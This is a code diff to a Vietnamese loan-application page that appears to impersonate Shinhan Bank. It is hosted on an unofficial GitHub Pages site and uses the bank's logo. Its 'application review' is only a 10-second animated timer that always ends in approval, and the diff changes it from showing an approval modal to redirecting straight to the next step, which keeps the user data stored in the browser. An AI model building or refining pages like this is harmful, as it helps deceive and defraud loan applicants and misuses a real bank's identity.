@@ -118,27 +118,8 @@
         .progress-bar-review-fill {
             height: 100%;
             background-color: #0033a0;
-            transition: width 0.3s ease-in-out;
-        }
-        .checkmark {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto;
-        }
-        .checkmark circle {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
-        }
-        .checkmark path {
-            stroke-dasharray: 48;
-            stroke-dashoffset: 48;
-            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
-        }
-        @keyframes stroke {
-            100% {
-                stroke-dashoffset: 0;
-            }
+            width: 0;
+            transition: width 0.1s linear;
         }
         .modal-content img {
             height: 30px;
@@ -243,7 +224,7 @@
             <div class="dropdown">
                 <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
                 <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆ\&U</a></li>
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
@@ -273,36 +254,12 @@
         <div id="step5">
             <h5 class="section-title">ĐANG XÉT DUYỆT HỒ SƠ</h5>
             <div class="review-container">
-                <p class="review-message">Hồ sơ đang được xét duyệt. Quý khách vui lòng chờ. Ngân hàng Shinhanbank đang thẩm định và xét duyệt. Quá trình này sẽ mất vài giây.</p>
+                <p class="review-message">Hồ sơ đang được xét duyệt. Quý khách vui lòng chờ. Ngân hàng Shinhanbank đang thẩm định và xét duyệt. Quá trình này sẽ mất 10 giây.</p>
                 <div class="spinner-border" role="status">
                     <span class="visually-hidden">Đang tải...</span>
                 </div>
                 <div class="progress-bar-review">
-                    <div class="progress-bar-review-fill" id="reviewProgressFill" style="width: 0%"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Modal: Celebration -->
-        <div class="modal fade" id="celebrationModal" tabindex="-1" aria-labelledby="celebrationModalLabel" aria-hidden="true">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
-                        <h5 class="modal-title" id="celebrationModalLabel">CHÚC MỪNG!</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                    </div>
-                    <div class="modal-body">
-                        <svg class="checkmark" viewBox="0 0 52 52">
-                            <circle cx="26" cy="26" r="25" fill="none" stroke="#28a745" stroke-width="4"/>
-                            <path fill="none" stroke="#28a745" stroke-width="4" d="M14 27l8 8 16-16"/>
-                        </svg>
-                        <p id="celebrationMessage">Hồ sơ của bạn đã được xét duyệt thành công!</p>
-                        <p id="approvalMessage"></p>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToStep6()">TIẾP TỤC</button>
-                    </div>
+                    <div class="progress-bar-review-fill" id="reviewProgressFill"></div>
                 </div>
             </div>
         </div>
@@ -344,29 +301,50 @@
         function loadUserData() {
             const storedData = localStorage.getItem('userData');
             if (storedData) {
-                Object.assign(userData, JSON.parse(storedData));
+                try {
+                    Object.assign(userData, JSON.parse(storedData));
+                } catch (error) {
+                    console.error('Error parsing userData:', error);
+                }
             }
         }
 
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                localStorage.setItem('userData', JSON.stringify(userData));
+            } catch (error) {
+                console.error('Error saving userData:', error);
+            }
         }
 
         function startProfileReview() {
             const progressFill = document.getElementById('reviewProgressFill');
-            progressFill.style.transition = 'width 10s linear';
-            progressFill.style.width = '100%';
-            setTimeout(() => {
-                $('#approvalMessage').text(`Đã đủ điều kiện xét duyệt thành công với số tiền ${formatNumber(userData.loanAmount) || ''} VND`);
-                const modal = new bootstrap.Modal(document.getElementById('celebrationModal'));
-                modal.show();
-            }, 10000);
-        }
+            if (!progressFill) {
+                console.error('Progress bar not found');
+                $('.review-message').text('Lỗi hệ thống, vui lòng thử lại.');
+                return;
+            }
 
-        function proceedToStep6() {
-            userData.currentStep = 6;
-            saveToLocalStorage();
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html';
+            let width = 0;
+            const duration = 10000; // 10 seconds
+            const startTime = performance.now();
+
+            function updateProgress(timestamp) {
+                const elapsed = timestamp - startTime;
+                width = (elapsed / duration) * 100;
+                progressFill.style.width = `${Math.min(width, 100)}%`;
+
+                if (elapsed < duration) {
+                    requestAnimationFrame(updateProgress);
+                } else {
+                    // Save data and redirect to step6
+                    userData.currentStep = 6;
+                    saveToLocalStorage();
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html';
+                }
+            }
+
+            requestAnimationFrame(updateProgress);
         }
 
         window.onload = function() {
